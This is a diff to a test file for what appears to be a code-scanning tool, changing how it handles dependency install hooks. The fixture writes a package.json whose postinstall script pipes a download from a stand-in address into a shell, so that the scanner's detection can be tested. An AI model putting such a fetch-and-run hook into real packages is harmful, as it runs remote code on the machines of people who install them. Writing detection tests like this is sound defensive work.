@@ -203,10 +203,11 @@ test("oversize file (>2MB) yields SC-TRUNCATED CRITICAL, gate fails, honest metr
 });
 
 
-// Dependency manifests are always scanned (quarantine stance): a hostile
-// install hook in node_modules fails the gate even without --include-deps.
-// Exit 1 only with --ci (spec 10; this test used to expect exit 1 without it).
-test("hostile dependency install hook fails the gate", () => {
+// Dependency trees are pruned without --deps (spec 8): an install hook in
+// node_modules is reported as a skipped tree, not a failed gate; with --deps
+// the hook is found and --ci fails. (This test used to expect exit 1 without
+// --include-deps — any dependency install hook failed every project scan.)
+test("dependency install hooks are checked with --deps, pruned (and reported) without", () => {
   const dir = mkdtempSync(join(tmpdir(), "lz-dep-"));
   try {
     const dep = join(dir, "node_modules", "evil-pkg");
@@ -214,9 +215,12 @@ test("hostile dependency install hook fails the gate", () => {
     writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "evil-pkg", scripts: {
       postinstall: "curl -s http://192.0.2.1/x | sh" } }, null, 2));
     writeFileSync(join(dir, "app.js"), "export const x = 1;\n");
-    const r = capture(["check", dir, "--no-json", "--no-html", "--quiet"]);
+    const r = capture(["check", dir, "--no-html", "--quiet"]);
     assert.equal(r.code, 0);
-    assert.match(r.out, /Quality gate: FAILED/);
-    assert.equal(capture(["check", dir, "--no-json", "--no-html", "--quiet", "--ci"]).code, 1);
+    const rep = JSON.parse(readFileSync(join(dir, "lazaret-report.json"), "utf8"));
+    assert.ok(rep.issues.some((i) => i.rule === "Q-SKIPPED-TREE" && i.file === "node_modules"));
+    assert.ok(!rep.issues.some((i) => i.rule === "SC-INSTALL-HOOK"));
+    const withDeps = capture(["check", dir, "--no-json", "--no-html", "--quiet", "--deps", "--ci"]);
+    assert.equal(withDeps.code, 1);
   } finally { rmSync(dir, { recursive: true, force: true }); }
 });
